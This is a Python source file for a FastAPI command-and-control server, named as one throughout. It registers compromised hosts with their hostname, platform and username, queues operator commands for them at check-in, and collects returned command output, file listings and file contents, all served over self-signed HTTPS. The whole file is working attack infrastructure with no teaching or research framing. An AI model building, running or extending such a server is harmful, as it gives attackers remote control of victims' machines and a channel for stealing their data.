import os
import time
import uuid
import json
import logging
import uvicorn
from typing import Dict, List, Optional, Any
from datetime import datetime
from fastapi import FastAPI, Request, HTTPException
from fastapi.responses import JSONResponse
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
import ssl

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.FileHandler("c2_server.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("c2_server")

# Models for data validation
class RegisterData(BaseModel):
    hostname: str
    platform: str
    release: str
    username: str
    clientId: str

class CheckinData(BaseModel):
    clientId: str

class CommandResult(BaseModel):
    clientId: str
    commandType: str
    output: Optional[str] = None
    items: Optional[List[Dict[str, Any]]] = None
    path: Optional[str] = None
    content: Optional[str] = None
    error: Optional[str] = None
    success: Optional[bool] = None

# Initialize FastAPI app
app = FastAPI(title="C2 Server", docs_url=None, redoc_url=None)

# Add CORS middleware for web interface
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],  # Allows all origins
    allow_credentials=True,
    allow_methods=["GET", "POST", "PUT", "DELETE", "OPTIONS"],
    allow_headers=["*"],
    expose_headers=["Content-Type", "X-Requested-With", "Authorization"],
    max_age=86400,  # Cache preflight requests for 24 hours
)

# In-memory storage for connected clients and pending commands
connected_clients = {}
command_queue = {}
command_results = {}

# Commands in queue with timestamps
pending_commands = {}

@app.post("/register")
async def register_client(data: RegisterData):
    client_id = data.clientId
    
    # Store client information
    connected_clients[client_id] = {
        "hostname": data.hostname,
        "platform": data.platform,
        "release": data.release,
        "username": data.username,
        "first_seen": datetime.now().isoformat(),
        "last_seen": datetime.now().isoformat(),
        "ip_address": None  # Will be populated from request
    }
    
    # Initialize command queue for this client
    if client_id not in command_queue:
        command_queue[client_id] = []
    
    logger.info(f"New client registered: {client_id} ({data.hostname})")
    return {"status": "registered"}

@app.post("/checkin")
async def client_checkin(data: CheckinData, request: Request):
    client_id = data.clientId
    
    # Check if client exists
    if client_id not in connected_clients:
        logger.warning(f"Unknown client checked in: {client_id}")
        return {"status": "unknown"}
    
    # Update client information
    connected_clients[client_id]["last_seen"] = datetime.now().isoformat()
    connected_clients[client_id]["ip_address"] = request.client.host
    
    # Check if there are pending commands
    if client_id in command_queue and command_queue[client_id]:
        command = command_queue[client_id].pop(0)
        logger.info(f"Sending command to {client_id}: {command['type']}")
        return {"status": "ok", "command": command}
    
    return {"status": "ok"}

@app.post("/result")
async def command_result(result: CommandResult):
    client_id = result.clientId
    
    if client_id not in connected_clients:
        logger.warning(f"Result from unknown client: {client_id}")
        return {"status": "unknown"}
    
    # Store the result
    if client_id not in command_results:
        command_results[client_id] = []
    
    command_results[client_id].append({
        "timestamp": datetime.now().isoformat(),
        "type": result.commandType,
        "output": result.output,
        "items": result.items,
        "path": result.path,
        "content": result.content,
        "error": result.error,
        "success": result.success
    })
    
    logger.info(f"Received result from {client_id} for command: {result.commandType}")
    return {"status": "received"}

# API endpoints for the C2 operator interface

@app.get("/clients")
async def list_clients():
    """List all connected clients"""
    return connected_clients

@app.get("/clients/{client_id}")
async def get_client(client_id: str):
    """Get detailed information about a specific client"""
    if client_id not in connected_clients:
        raise HTTPException(status_code=404, detail="Client not found")
    
    return connected_clients[client_id]

@app.post("/command/{client_id}")
async def send_command(client_id: str, command: Dict[str, Any]):
    """Queue a command for a specific client"""
    if client_id not in connected_clients:
        raise HTTPException(status_code=404, detail="Client not found")
    
    command_id = str(uuid.uuid4())
    command["id"] = command_id
    command["timestamp"] = datetime.now().isoformat()
    
    if client_id not in command_queue:
        command_queue[client_id] = []
    
    command_queue[client_id].append(command)
    logger.info(f"Command queued for {client_id}: {command['type']}")
    
    return {"status": "queued", "command_id": command_id}

@app.get("/results/{client_id}")
async def get_results(client_id: str):
    """Get command results for a specific client"""
    if client_id not in connected_clients:
        raise HTTPException(status_code=404, detail="Client not found")
    
    if client_id not in command_results:
        return []
    
    return command_results[client_id]

@app.delete("/clients/{client_id}")
async def delete_client(client_id: str):
    """Remove a client from the system"""
    if client_id not in connected_clients:
        raise HTTPException(status_code=404, detail="Client not found")
    
    del connected_clients[client_id]
    
    if client_id in command_queue:
        del command_queue[client_id]
    
    if client_id in command_results:
        del command_results[client_id]
    
    logger.info(f"Client removed: {client_id}")
    return {"status": "removed"}

@app.delete("/results/{client_id}")
async def clear_results(client_id: str):
    """Clear command results for a specific client"""
    if client_id not in connected_clients:
        raise HTTPException(status_code=404, detail="Client not found")
    
    if client_id in command_results:
        command_results[client_id] = []
    
    logger.info(f"Results cleared for client: {client_id}")
    return {"status": "cleared"}

@app.post("/results/{client_id}/{result_id}/mark-processed")
async def mark_result_processed(client_id: str, result_id: int):
    """Mark a specific result as processed"""
    if client_id not in command_results:
        raise HTTPException(status_code=404, detail="Client not found")
    
    if result_id < 0 or result_id >= len(command_results[client_id]):
        raise HTTPException(status_code=404, detail="Result not found")
    
    try:
        # Mark the result as processed
        command_results[client_id][result_id]['processed'] = True
        logger.info(f"Marked result {result_id} as processed for client {client_id}")
        return {"status": "marked as processed"}
    except Exception as e:
        logger.error(f"Error marking result as processed: {str(e)}")
        raise HTTPException(status_code=500, detail=f"Error: {str(e)}")

# Helper functions for the CLI interface

def generate_self_signed_cert():
    """Generate a self-signed certificate for HTTPS"""
    from OpenSSL import crypto
    
    # Create key pair
    k = crypto.PKey()
    k.generate_key(crypto.TYPE_RSA, 2048)
    
    # Create self-signed certificate
    cert = crypto.X509()
    cert.get_subject().C = "US"
    cert.get_subject().ST = "State"
    cert.get_subject().L = "City"
    cert.get_subject().O = "Organization"
    cert.get_subject().OU = "Organizational Unit"
    cert.get_subject().CN = "localhost"
    cert.set_serial_number(1000)
    cert.gmtime_adj_notBefore(0)
    cert.gmtime_adj_notAfter(10*365*24*60*60)  # 10 years
    cert.set_issuer(cert.get_subject())
    cert.set_pubkey(k)
    cert.sign(k, 'sha256')
    
    # Write certificate and key to files
    with open("server.crt", "wb") as f:
        f.write(crypto.dump_certificate(crypto.FILETYPE_PEM, cert))
    
    with open("server.key", "wb") as f:
        f.write(crypto.dump_privatekey(crypto.FILETYPE_PEM, k))
    
    logger.info("Generated self-signed certificate")

def setup_ssl_context():
    """Setup SSL context for HTTPS"""
    # Check if certificate exists, if not generate one
    if not os.path.exists("server.crt") or not os.path.exists("server.key"):
        generate_self_signed_cert()
    
    # Create SSL context
    ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    ssl_context.load_cert_chain("server.crt", "server.key")
    
    return ssl_context

if __name__ == "__main__":
    # Create data directories if they don't exist
    os.makedirs("data", exist_ok=True)
    
    # Setup SSL for HTTPS
    ssl_context = setup_ssl_context()
    
    # Run the server
    host = "0.0.0.0"  # Listen on all interfaces
    port = 8443
    
    logger.info(f"Starting C2 server on https://{host}:{port}")
    
    uvicorn.run(
        "main:app",
        host=host,
        port=port,
        ssl_certfile="server.crt",
        ssl_keyfile="server.key",
        reload=False
    )
